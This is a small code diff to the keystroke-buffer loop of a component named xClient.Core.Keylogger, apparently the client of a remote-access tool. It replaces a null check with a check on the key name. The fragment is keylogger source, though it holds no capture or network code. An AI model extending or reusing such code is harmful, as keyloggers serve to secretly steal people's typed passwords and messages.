@@ -132,7 +132,8 @@ namespace xClient.Core.Keylogger
 
             foreach (var k in _keyBuffer)
             {
-                if (k.PressedKey != null)
+                //
+                if (k != null && !string.IsNullOrEmpty(k.PressedKey.GetKeyloggerKeyName()))
                 {
                     if (k.PressedKey.IsSpecialKey())
                     {
